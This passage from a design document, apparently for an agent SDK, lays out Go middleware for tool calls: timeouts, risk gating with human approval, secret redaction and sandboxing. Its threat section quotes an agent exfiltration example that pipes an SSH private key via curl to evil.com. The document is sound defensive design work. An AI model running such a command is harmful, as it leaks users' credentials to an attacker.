        }
    }
    return intent
}

func (m *LocalityEnricher) classify(r tool.IntentResource) string {
    switch r.Category {
    case "file", "directory":
        for _, prefix := range m.Config.SecretPrefixes {
            if strings.HasPrefix(r.Value, prefix) { return "secret" }
        }
        for _, prefix := range m.Config.SensitivePrefixes {
            if strings.HasPrefix(r.Value, prefix) { return "sensitive" }
        }
        for _, prefix := range m.Config.WorkspacePrefixes {
            if strings.HasPrefix(r.Value, prefix) { return "workspace" }
        }
        return "unknown"
    case "url", "host":
        return "network"
    default:
        return "unknown"
    }
}
```

### OnIntent Example: Audit Trail Middleware

A middleware that writes audit logs declares its own additional intent:

```go
type AuditMiddleware struct {
    tool.HooksBase
    AuditLogPath string
}

func (m *AuditMiddleware) OnIntent(_ tool.Ctx, _ tool.Tool, intent tool.Intent, _ tool.CallState) tool.Intent {
    // Append the audit log write as an additional operation.
    // Risk assessors will see this and can factor it in.
    intent.Operations = append(intent.Operations, tool.IntentOperation{
        Resource: tool.IntentResource{
            Category: "file",
            Value:    m.AuditLogPath,
            Locality: "workspace",
        },
        Operation: "write",
        Certain:   true,
    })
    if !slices.Contains(intent.Behaviors, "filesystem_write") {
        intent.Behaviors = append(intent.Behaviors, "filesystem_write")
    }
    return intent
}
```

---

## Part 4: Timeout Middleware (Refined)

```go
type TimeoutMiddleware struct {
    tool.HooksBase
    Default time.Duration // fallback when LLM doesn't specify
    Max     time.Duration // hard cap
}

func (m *TimeoutMiddleware) OnSchema(inner tool.Tool) *jsonschema.Schema {
    extended := cloneSchema(inner.Schema())
    if extended.Properties == nil {
        extended.Properties = jsonschema.NewProperties()
    }
    extended.Properties.Set("timeout", &jsonschema.Schema{
        Type:        "string",
        Description: "Per-call timeout duration (e.g. '30s', '2m', '5m'). Optional.",
        Examples:    []any{"30s", "2m", "5m"},
    })
    return extended
}

func (m *TimeoutMiddleware) OnGuidance(inner tool.Tool) string {
    base := inner.Guidance()
    extra := fmt.Sprintf("Accepts an optional `timeout` parameter for long-running operations (default %s, max %s).", m.Default, m.Max)
    if base != "" {
        return base + "\n" + extra
    }
    return extra
}

func (m *TimeoutMiddleware) OnInput(_ tool.Ctx, _ tool.Tool, input json.RawMessage, state tool.CallState) (json.RawMessage, tool.Result, error) {
    var raw map[string]json.RawMessage
    if err := json.Unmarshal(input, &raw); err != nil {
        // Not a JSON object — pass through (shouldn't happen with valid schema)
        state["timeout"] = m.Default
        return input, nil, nil
    }

    dur := m.Default
    if timeoutRaw, has := raw["timeout"]; has {
        // Strip timeout from input before forwarding to inner tool
        delete(raw, "timeout")
        stripped, _ := json.Marshal(raw)
        input = stripped

        var s string
        if json.Unmarshal(timeoutRaw, &s) == nil && s != "" {
            if parsed, err := parseDuration(s); err == nil {
                dur = parsed
            }
        }
    }

    if m.Max > 0 && dur > m.Max {
        dur = m.Max
    }
    state["timeout"] = dur
    return input, nil, nil
}

func (m *TimeoutMiddleware) OnContext(ctx tool.Ctx, state tool.CallState) (tool.Ctx, func()) {
    dur, _ := state["timeout"].(time.Duration)
    if dur > 0 {
        newCtx, cancel := context.WithTimeout(ctx, dur)
        return tool.WrapCtx(ctx, newCtx), cancel
    }
    return ctx, nil
}

func (m *TimeoutMiddleware) OnResult(_ tool.Ctx, _ tool.Tool, _ json.RawMessage, res tool.Result, err error, state tool.CallState) (tool.Result, error) {
    // If the tool timed out, annotate the result with the timeout duration.
    if errors.Is(err, context.DeadlineExceeded) {
        dur, _ := state["timeout"].(time.Duration)
        label := fmt.Sprintf("[Timed out after %s]", dur)
        if res != nil {
            partial := res.String()
            if partial != "" {
                return tool.Error(partial + "\n\n" + label), nil
            }
        }
        return tool.Error(label), nil
    }
    return res, err
}
```

### Interaction with Executor Timeout

The runner's `defaultToolExecutor` currently applies a blanket `context.WithTimeout`. With middleware timeouts:

- **Both can coexist.** The executor timeout is the outer safety net. The middleware timeout is the inner, tool-specific one. Whichever is shorter fires first.
- **Migration path**: Eventually, tools with timeout middleware don't need the executor timeout. The executor timeout becomes "max allowed per tool call" — a hard ceiling.
- **No runner changes needed.** The middleware sets a deadline on the context before `Execute` is called. The executor's deadline is already on the parent context. `context.WithTimeout` on an already-deadlined context picks the earlier deadline.

---

## Part 5: Context Wrapping Helpers

```go
package tool

// WrapCtx returns a new Ctx that uses newCtx for deadline/cancellation
// but preserves all Ctx metadata (WorkDir, AgentID, SessionID, Extra).
func WrapCtx(base Ctx, newCtx context.Context) Ctx {
    return &wrappedCtx{Ctx: base, Context: newCtx}
}

type wrappedCtx struct {
    Ctx
    context.Context
}

func (c *wrappedCtx) Deadline() (time.Time, bool) { return c.Context.Deadline() }
func (c *wrappedCtx) Done() <-chan struct{}        { return c.Context.Done() }
func (c *wrappedCtx) Err() error                   { return c.Context.Err() }
func (c *wrappedCtx) Value(key any) any            { return c.Context.Value(key) }
```

Note: This is the same pattern already used in `runner/executor.go` (`contextToolCtx`). We'd promote it to a public helper in the `tool` package.

### Approver via Context

The approver is a UI concern — it depends on whether we're in a TUI, CI, or
headless mode. It doesn't belong in the middleware definition (which is
tool/plugin-scoped). Instead, the app/runtime layer injects it into the
context, and the RiskGate resolves it at call time.

```go
package tool

// Approver is called when a tool call needs human approval.
// Defined in the tool package so it can be carried via context without
// creating import cycles between tool and toolmw.
//
// Parameters:
//   - ctx: the tool execution context
//   - intent: what the tool is about to do (resources, operations, behaviors)
//   - detail: optional assessment detail from the risk gate (type-assert to
//     toolmw.Assessment if you need dimensions/rationale; nil if not available)
//
// Returns true if approved, false if denied.
type Approver func(ctx Ctx, intent Intent, detail any) (bool, error)

type approverKey struct{}

// ApproverFrom extracts the Approver from a Ctx.
// Returns nil if no approver is set.
func ApproverFrom(ctx Ctx) Approver {
    if v := ctx.Value(approverKey{}); v != nil {
        if a, ok := v.(Approver); ok {
            return a
        }
    }
    return nil
}

// CtxWithApprover returns a new context with the given Approver.
func CtxWithApprover(ctx context.Context, approver Approver) context.Context {
    return context.WithValue(ctx, approverKey{}, approver)
}
```

The app/runtime layer sets it once:

```go
// In terminal/cli or app.App setup:
ctx = tool.CtxWithApprover(ctx, tui.PromptApproval)

// Or for CI (auto-deny):
ctx = tool.CtxWithApprover(ctx, func(_ tool.Ctx, _ tool.Intent, _ any) (bool, error) {
    return false, nil // always deny in CI
})

// Or for headless with allowlist:
ctx = tool.CtxWithApprover(ctx, allowlist.Check)
```

This means:
- **Plugin authors** wire `RiskGate{Assessor: ...}` without knowing the UI.
- **App authors** set `WithApprover(...)` once at the top level.
- **RiskGate** resolves: own `.Approver` field first, then `ApproverFrom(ctx)`, then nil → deny.

---

## Part 6: Wiring & Plugin Integration

### Per-Tool

```go
// Plugin/tool layer: wire assessor only. No UI dependency.
bash := shell.NewBashTool(shell.WithRiskAnalyzer(cmdriskAnalyzer))
richBash := tool.Apply(bash,
    tool.HooksMiddleware(&toolmw.TimeoutMiddleware{Default: 30*time.Second, Max: 5*time.Minute}),
    tool.HooksMiddleware(&toolmw.RiskGate{
        Assessor: &toolmw.CompositeAssessor{
            CmdRisk: &toolmw.CmdRiskAssessor{Analyzer: cmdriskAnalyzer},
            Policy:  &toolmw.PolicyAssessor{Locality: localityCfg},
        },
        // Approver intentionally nil — resolved from context at call time.
    }),
)
catalog.Register(richBash)

// App/runtime layer: inject approver once for all tools.
// In terminal/cli:
ctx = tool.CtxWithApprover(ctx, tui.PromptApproval)
// In CI:
ctx = tool.CtxWithApprover(ctx, func(_ tool.Ctx, _ tool.Intent, _ any) (bool, error) {
    return false, nil // always deny
})
```

### Global

```go
// ApplyAll wraps every tool in a catalog with the given middlewares.
func (c *Catalog) ApplyAll(middlewares ...Middleware) {
    for _, name := range c.order {
        t := c.tools[name]
        c.tools[name] = Apply(t, middlewares...)
    }
}
```

### Via Plugin

```go
// ToolMiddlewarePlugin contributes middlewares applied to all tools
// after all tools have been registered.
type ToolMiddlewarePlugin interface {
    Plugin
    ToolMiddlewares() []tool.Middleware
}

// ToolTargetedMiddlewarePlugin contributes middlewares for specific tools
// (matched by name or glob pattern).
type ToolTargetedMiddlewarePlugin interface {
    Plugin
    ToolMiddlewaresFor(toolName string) []tool.Middleware
}
```

Application order in `app.App`:
1. All `ToolsPlugin` register their tools.
2. `ToolTargetedMiddlewarePlugin` middlewares are applied per-tool.
3. `ToolMiddlewarePlugin` middlewares are applied globally (outermost).

---

## Part 7: How This Relates to cmdrisk

### cmdrisk's Pipeline (for bash)

```
raw command string
  → shell AST parse
    → token role extraction (executable, arg, redirect target, ...)
      → semantic resolution (operations: what kind of action)
        → target resolution (resources: what is acted upon, with category+role+locality)
          → behavior classification (filesystem_read, network_fetch, ...)
            → risk dimensions (destructiveness, scope, reversibility, ...)
              → policy decision (allow, requires_approval, reject)
```

### Tool Intent Pipeline (for all tools)

```
tool call JSON
  → DeclareIntent() — tool declares resources + operations directly
    → (already structured — no parsing needed)
      → IntentAssessor — scores risk using same dimensional model
        → policy decision (allow, requires_approval, reject)
```

### The Mapping

| cmdrisk concept | Tool Intent equivalent | Notes |
|---|---|---|
| `Target{Category, Role, Value, Locality, Certain}` | `IntentResource{Category, Value, Locality}` + `IntentOperation{Operation, Certain}` | Role → Operation |
| `Behavior` (filesystem_read, ...) | `Intent.Behaviors` | Same vocabulary |
| `Fact` | — | Not needed — intent is declared, not inferred |
| `Classification` (approved/passed/rejected) | — | Not needed — no parsing ambiguity |
| `Confidence` (high/moderate/low) | `Intent.Confidence` | "high" for structured tools |
| `Decision{Action, Reasons, Rationale}` | `Assessment.Decision` | Identical model |
| `RiskDimension{Name, Severity}` | `Assessment.Dimensions` | Same model |
| `AllowanceRule` / `Selector` | Reusable | Selectors match on category, operation, path, host, domain, locality |
| `Context{Environment, Asset, Trust}` | `LocalityConfig` + `Ctx` metadata | Simplified — structured tools need less context |

### Why This Works

cmdrisk's core insight: **risk = resources × operations × context**. The shell parser exists only because bash hides that information in opaque strings. For structured tools, the information is already in the typed params.

The same policy engine, dimensional scoring, and allowance rules work across both:
- **bash**: cmdrisk parses → extracts targets+behaviors → scores → decides
- **file_write**: tool declares `{file:/etc/crontab, write, system}` → scores → decides
- **web_fetch POST**: tool declares `{url:https://api.prod/deploy, network_write, network}` → scores → decides

---

## File Layout

```
tool/
├── tool.go              # Tool interface (unchanged)
├── base.go              # TypedTool (unchanged)
├── catalog.go           # Catalog (add ApplyAll method)
├── intent.go            # NEW: Intent, IntentOperation, IntentResource, IntentProvider, ExtractIntent
├── middleware.go         # NEW: Middleware, Hooks, HooksBase, Apply, Unwrap, Innermost, hookedTool, CallState
├── middleware_test.go    # NEW
├── approver.go          # NEW: Approver type, ApproverFrom, CtxWithApprover
├── ctxwrap.go           # NEW: WrapCtx (promote from runner/executor.go)
├── ctxwrap_test.go      # NEW
└── ...

toolmw/                   # NEW package: concrete middleware implementations
├── timeout.go           # TimeoutMiddleware
├── timeout_test.go
├── riskgate.go          # RiskGate + IntentAssessor + Assessment types
├── riskgate_test.go
├── policy.go            # PolicyAssessor (generic intent-based risk scoring)
├── policy_test.go
├── cmdrisk.go           # CmdRiskAssessor (bridges cmdrisk → IntentAssessor)
├── cmdrisk_test.go
├── composite.go         # CompositeAssessor
├── composite_test.go
├── secret.go            # SecretMiddleware (substitution + redaction)
├── secret_test.go
├── allowlist.go         # AllowlistAssessor (persisted approval rules)
├── allowlist_test.go
└── duration.go          # parseDuration (human-friendly durations)

secret/                   # NEW package: secret management (ported from fleet)
├── provider.go          # Provider interface, EnvProvider, MapProvider, CombinedProvider
├── resolver.go          # Resolver interface, DirectResolver, SocketResolver
├── server.go            # Secret server (Unix socket, namespaced)
├── server_test.go
└── substitute.go        # ${secret:NAME} pattern matching + redaction helpers

app/
├── plugin.go            # Add ToolMiddlewarePlugin, ToolTargetedMiddlewarePlugin
└── ...
```

---

## Decided Trade-offs

| Question | Decision |
|----------|----------|
| Cancel cleanup | OnContext returns `(Ctx, func())` — explicit, testable, no leaks |
| Schema clone | JSON round-trip — safe, schemas are small |
| Per-call state | `CallState` map — explicit, typed, no key collisions across middlewares |
| Middleware ordering | First = innermost — `Apply(t, m1, m2)` means m2 wraps m1 wraps t |
| DeclareIntent caller | Middleware calls via ExtractIntent — runner stays simple |
| Fail-open vs fail-closed | Fail closed (deny) by default, configurable — safety first |
| cmdrisk dependency | Direct `go.mod` dependency — agentsdk imports cmdrisk as a Go library. Bridge (`toolmw/cmdrisk.go`) lives in agentsdk. |
| Intent for opaque tools | Opaque/low-confidence for v1 — honest about uncertainty |
| Approver interface | `func(Ctx, Intent, any) (bool, error)` in `tool` pkg — `any` avoids import cycle with `toolmw` |
| Where to store cmdrisk.Assessment | `Intent.Extra any` — travels with the intent, no global state |
| Validation after schema extension | Each middleware validates its own fields, strips before forwarding |
| Catalog keys vs OnName | Catalog keys by original registration name. `OnName` only changes what the LLM sees. `Select("bash")` always works even if middleware renames to `"safe_bash"`. |
| ToolClass ownership | Lives in `Intent` only. Tools that care about risk must implement `IntentProvider`. No separate `ToolClassifier` interface for v1. |
| ExtractIntent scope | Called with `inner` (the tool below the calling middleware), not the outermost. Middlewares above the caller don't get `OnIntent`. This is correct — RiskGate sees intent enriched by layers below it. |
| Plugin middleware ordering | Two-pass in `app.App`: (1) all `ToolsPlugin` register tools, (2) `ToolTargetedMiddlewarePlugin` + `ToolMiddlewarePlugin` apply middlewares. No single-pass interleaving. |

---

## Part 8: Competitive Analysis

### Codex CLI (Rust) — Sandbox-first + exec policy rules

Two enforcement layers:

1. **OS-level sandbox** (primary defense). Every shell command runs inside a real sandbox (macOS Seatbelt, Linux Landlock/Bubblewrap, Windows restricted tokens). The sandbox physically prevents writes outside allowed paths and blocks network. Three modes: `read-only`, `workspace-write`, `full-auto`.

2. **Exec policy rules** (`.rules` files, Starlark-based). Command prefix matching: `allow prefix ["git", "status"]`, `prompt prefix ["rm"]`, `forbidden prefix ["sudo"]`. Three decisions: Allow, Prompt, Forbidden. Evaluated before sandbox.

3. **Heuristics fallback** — `is_known_safe_command()` and `command_might_be_dangerous()` for unmatched commands.

4. **Guardian** — LLM-based auto-reviewer. A separate model call assesses whether the action aligns with user intent. Returns `risk_level` + `user_authorization` + `outcome`. Circuit breakers (max 3 consecutive denials, 10 total per turn).

5. **Patch safety** — `apply_patch` has its own check: is the write constrained to writable roots? Auto-approve inside sandbox if yes.

**Key insight:** Codex doesn't score risk dimensionally. It's binary: sandbox enforces physical boundaries, rules match command prefixes, guardian LLM makes judgment calls. No resource/operation/locality model.

### Claude Code (TypeScript) — Per-tool checkPermissions + wildcard rules

1. **Each tool defines `checkPermissions(input, context)`** — returns `{granted, reason, prompt}`. Tools self-declare what needs approval. `isReadOnly(input)` is a separate method — read-only tools skip permission checks.

2. **Permission modes:** `default` (prompt each), `plan` (batch approve), `bypassPermissions` (auto-approve all), `auto` (ML classifier, experimental).

3. **Wildcard rules** — `Bash(git *)`, `FileEdit(/src/*)`, `FileRead(*)`. Pattern-matched at tool+argument level.

4. **Four-layer model:** tool-level `isReadOnly` → permission rules matching → `checkPermissions()` per tool → user prompt.

**Key insight:** Claude Code's model is tool-centric — each tool owns its permission logic. No abstract resource/operation model. Rules are pattern shortcuts to skip prompts.

### Comparison

| Aspect | Codex CLI | Claude Code | Our Design |
|--------|-----------|-------------|------------|
| Primary defense | OS sandbox | Tool-level `checkPermissions` | Middleware RiskGate + sandbox (planned) |
| Risk model | Binary (safe/dangerous) | Binary (read-only/needs-approval) | Dimensional (operation × locality → score) |
| Who decides | Rules + heuristics + guardian LLM | Tool itself + rules + mode | Tool declares intent → assessor scores → gate decides |
| Rule format | Starlark `.rules` files | Wildcard `Tool(glob)` | `IntentAssessor` implementations |
| Bash handling | Heuristics + guardian LLM | `checkPermissions` + rules | cmdrisk (full shell AST parsing) |
| Sandbox | OS-level (Seatbelt/Landlock/bwrap) | None | Bubblewrap (planned, prior art in fleet) |
| Secret protection | None visible | None visible | Secret server + env redaction (from fleet) |
| Rule persistence | `.rules` files + `ExecPolicyAmendment` | Wildcard rules in config | Planned (Phase 6) |
| Composability | Monolithic | Monolithic | Middleware stacking |

### Where we're solid

- **Intent declaration** is strictly better than Claude Code's `checkPermissions`. Tools declare *what* they'll do, not just *whether* they need approval. More composable and auditable.
- **Middleware composability** — neither competitor has this. Their permission logic is hardwired.
- **cmdrisk for bash** is more rigorous than both. Codex uses heuristics + LLM guardian. We parse the actual shell AST.
- **Dimensional scoring** gives nuance that binary allow/deny doesn't.

### What we need to add (expanded scope)

- **OS sandbox** — Bubblewrap integration for bash tool execution. Prior art exists in `~/projects/fleet/internal/sandbox/`.
- **Secret protection** — Secret server (Unix socket, out-of-process), env clearing inside sandbox, `${secret:NAME}` substitution in tool args, automatic redaction of secret values in tool output. Prior art in `~/projects/fleet/internal/secret/`.
- **Rule persistence** — "always allow X" decisions persisted to config, with revocation.

---

## Part 9: Secret Protection & Environment Security

Prior art from `~/projects/fleet/internal/secret/` and `~/projects/fleet/internal/sandbox/`.

### The Problem

API keys and secrets in environment variables are trivially exfiltrable by an agent:
```
bash: printenv | grep KEY
bash: curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com
```

Codex does `--clearenv` inside its sandbox, but has no secret substitution or output redaction — if a tool needs an API key, it must be passed through. Claude Code has no secret protection. We already solved this comprehensively in fleet.

### Architecture (from fleet)

```
┌─────────────────────────────────────────────────────────┐
│                    Host Process                          │
│                                                         │
│  ┌─────────────┐    ┌──────────────────────────────┐    │
│  │ Secret      │    │ Bubblewrap Sandbox            │    │
│  │ Server      │◄───│                               │    │
│  │ (Unix sock) │    │  - --clearenv (no env vars)   │    │
│  │             │    │  - FLEET_SECRET_SOCKET=path    │    │
│  │ Namespaces: │    │  - FLEET_SECRET_NAMES=a,b,c   │    │
│  │  framework: │    │  - --overlay-src cwd          │    │
│  │  agent:KEY  │    │  - --tmpfs /home              │    │
│  └─────────────┘    │                               │    │
│                     │  Agent sees secret NAMES but   │    │
│                     │  never VALUES in env.          │    │
│                     │  LLM adapter fetches keys via  │    │
│                     │  socket at CreateStream() time.│    │
│                     └──────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
```

### Key Mechanisms

1. **Secret Server** — Unix socket, out-of-process. Two namespaces:
   - `framework:` — framework secrets (API keys for LLM providers). Only the LLM adapter uses these.
   - `agent:` — user-provided secrets (`--secret` flags). Available to tools via `${secret:NAME}` substitution.

2. **Environment Clearing** — `bwrap --clearenv` strips ALL env vars. Only explicit passthrough vars (TERM, LD_LIBRARY_PATH) are re-set. API keys never enter the sandbox environment.

3. **Secret Substitution Hook** (OnToolCall) — Replaces `${secret:NAME}` patterns in tool arguments with actual values fetched from the secret server. The LLM sees the pattern, never the value.

4. **Redaction Hook** (OnToolResult) — After tool execution, replaces any occurrence of a used secret value in the output with `[REDACTED:NAME]`. Prevents secrets from leaking into conversation history.

5. **Overlay Filesystem** — `bwrap --overlay-src cwd --tmp-overlay cwd` gives the sandbox read access to the workspace but writes go to tmpfs. On exit, all changes are discarded (unless explicitly committed).

### Mapping to Our Middleware

Fleet's hooks map directly to our middleware system:

| Fleet mechanism | Our equivalent |
|----------------|----------------|
| `OnToolCallHook` (substitution) | `Hooks.OnInput` — replace `${secret:NAME}` in input JSON |
| `OnToolResultHook` (redaction) | `Hooks.OnResult` — redact secret values in result |
| `hook.Registry` with priorities | `tool.Apply()` ordering |
| `secret.Resolver` | `secret.Resolver` (port directly) |
| `bwrap` sandbox | Bash tool internal — not middleware (middleware controls *policy*, tool controls *mechanism*) |

```go
// SecretMiddleware — port from fleet's secret hooks
type SecretMiddleware struct {
    tool.HooksBase
    Resolver secret.Resolver
}

func (m *SecretMiddleware) OnInput(ctx tool.Ctx, inner tool.Tool, input json.RawMessage, state tool.CallState) (json.RawMessage, tool.Result, error) {
    // Replace ${secret:NAME} patterns in input JSON
    substituted := secret.Substitute(ctx, m.Resolver, string(input))
    return json.RawMessage(substituted), nil, nil
}

func (m *SecretMiddleware) OnResult(ctx tool.Ctx, inner tool.Tool, input json.RawMessage, res tool.Result, err error, state tool.CallState) (tool.Result, error) {
    // Redact secret values in result text
    if res != nil {
        redacted := secret.Redact(m.Resolver, res.String())
        if redacted != res.String() {
            return tool.Text(redacted), nil // TODO: preserve IsError, blocks, etc.
        }
    }
    return res, err
}
```

---

## Part 10: Sandbox Integration

Prior art from `~/projects/fleet/internal/sandbox/`.

### Approach

The sandbox is NOT a middleware — it's an execution environment for the bash tool specifically. But the middleware system controls *whether* to use it:

1. **RiskGate** assesses intent → decides allow/prompt/deny
2. If allowed, the bash tool's `Execute` runs the command inside bubblewrap
3. **SecretMiddleware** handles substitution (OnInput) and redaction (OnResult)

### Sandbox Configuration

```go
// In bash tool setup:
type BashToolConfig struct {
    Sandbox     SandboxConfig  // bubblewrap settings
    RiskAnalyzer *cmdrisk.Analyzer
}

type SandboxConfig struct {
    Enabled       bool
    WorkspaceDir  string   // mounted read-write (overlay)
    ReadOnlyDirs  []string // additional ro mounts
    AllowNetwork  bool
    SecretSocket  string   // path to secret server socket
}
```

The bash tool internally uses bubblewrap when `Sandbox.Enabled` is true. This is tool-internal, not middleware — the middleware layer handles the *policy* (should this run?), the tool handles the *mechanism* (how to run safely).

---

## Implementation Phases

### Phase 1: Core Middleware (no intent, no risk)
- `tool/middleware.go` — Middleware, Hooks, HooksBase, Apply, Unwrap, Innermost, hookedTool, CallState
- `tool/ctxwrap.go` — WrapCtx
- `tool/middleware_test.go`
- `toolmw/timeout.go` — TimeoutMiddleware
- `toolmw/timeout_test.go`

**Validates**: Middleware abstraction, schema extension, per-call state, context modification.

### Phase 2: Intent Types
- `tool/intent.go` — Intent, IntentOperation, IntentResource, IntentProvider, ExtractIntent
- Add `DeclareIntent` to file_read, file_write, file_delete, file_edit, web_fetch, grep, glob
- Tests for each tool's intent declaration

**Validates**: Intent model captures real tool semantics.

### Phase 3: Risk Gate
- `toolmw/riskgate.go` — RiskGate middleware
- `toolmw/policy.go` — PolicyAssessor
- `toolmw/cmdrisk.go` — CmdRiskAssessor (cmdrisk bridge)
- `toolmw/composite.go` — CompositeAssessor
- Integration tests

**Validates**: End-to-end risk assessment for structured tools.

### Phase 4: Plugin Integration
- `app/plugin.go` — ToolMiddlewarePlugin, ToolTargetedMiddlewarePlugin
- Two-pass wiring in `app.App`
- `catalog.ApplyAll`

**Validates**: Middleware contributed via plugins.

### Phase 5: bash + cmdrisk Integration
- `cmdrisk.Analyzer` option on bash tool
- `DeclareIntent` on bash tool
- CmdRiskAssessor wiring
- End-to-end test: bash → cmdrisk → risk gate → approve/deny

**Validates**: Full cmdrisk integration.

### Phase 6: Approval Persistence
- Persisted allowance rules ("always allow file_read in workspace")
- Rule storage format (JSON/TOML in `~/.config/agentsdk/rules/` or project-level)
- Revocation (`/permissions` command or API)
- `AllowlistAssessor` — checks persisted rules before scoring
- Composable with `PolicyAssessor`: allowlist first, then score unmatched
- Session-scoped vs persistent rules

**Validates**: Users can build trust incrementally without re-approving.

### Phase 7: Secret Protection
- Port `secret.Resolver`, `secret.Provider` from fleet
- `SecretMiddleware` (OnInput: substitution, OnResult: redaction)
- Secret server (Unix socket, namespaced: `framework:` / `agent:`)
- `${secret:NAME}` pattern in tool arguments
- `[REDACTED:NAME]` in tool output
- Integration with Approver context (secrets available to approval UI)

**Validates**: Secrets never leak into conversation history or tool output.

### Phase 8: Sandbox (Bubblewrap)
- Port bubblewrap integration from fleet to bash tool
- `--clearenv` + explicit passthrough
- Overlay filesystem for workspace
- Secret socket bind-mount
- Sandbox config derived from `Intent` locality (workspace → overlay, system → deny)
- `--no-sandbox` opt-out flag

**Validates**: Bash commands physically isolated. Defense in depth with RiskGate.

---

## Summary

Five complementary layers, all starting from the middleware foundation:

1. **Generic Middleware** (`tool.Middleware`, `tool.Hooks`, `tool.CallState`) — composable wrappers for any tool. Pure plumbing. ~200 lines.

2. **Tool Intent** (`tool.IntentProvider`, `tool.Intent`) — tools declare what they'll do as abstract resource+operation pairs. Same vocabulary as cmdrisk. ~100 lines of types.

3. **Risk Gate** (`toolmw.RiskGate`, `toolmw.IntentAssessor`) — middleware that extracts intent, scores risk, gates on approval. Bridges to cmdrisk for bash. ~300 lines.

4. **Secret Protection** (`toolmw.SecretMiddleware`, `secret.Resolver`) — substitution of `${secret:NAME}` in tool input, redaction of secret values in output. Secret server for sandbox mode. ~200 lines.

5. **Sandbox** (bash tool internal) — Bubblewrap isolation for shell commands. Env clearing, overlay filesystem, secret socket. Policy driven by RiskGate + Intent locality. ~150 lines.

Together: risk gating, secret protection, sandbox isolation, approval persistence, timeout control, observability — all composable, all backward compatible, no changes to the `Tool` interface.

Key wiring principle: **tools/plugins own assessment** (what to check), **the app/runtime owns approval** (how to ask the user). The `Approver` lives in `tool.Ctx` via `CtxWithApprover`, not in the middleware definition. Approval decisions can be persisted and revoked.
